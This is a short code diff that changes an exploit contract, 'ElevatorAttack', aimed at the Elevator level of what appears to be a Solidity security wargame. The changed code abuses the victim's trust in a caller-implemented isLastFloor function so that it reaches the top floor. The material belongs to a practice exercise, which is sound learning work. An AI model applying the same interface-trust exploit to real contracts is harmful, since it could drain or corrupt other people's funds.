@@ -3,15 +3,12 @@ pragma solidity ^0.5.0;
 import '../levels/Elevator.sol';
 
 contract ElevatorAttack {
-  bool public isLast = true;
-  
-  function isLastFloor(uint) public returns (bool) {
-    isLast = ! isLast;
-    return isLast;
+  function isLastFloor(uint floor) public view returns (bool) {
+    return floor == Elevator(msg.sender).floor();
   }
 
   function attack(address _victim) public {
     Elevator elevator = Elevator(_victim);
-    elevator.goTo(10);
+    elevator.goTo(elevator.floor() + 1);
   }
 }
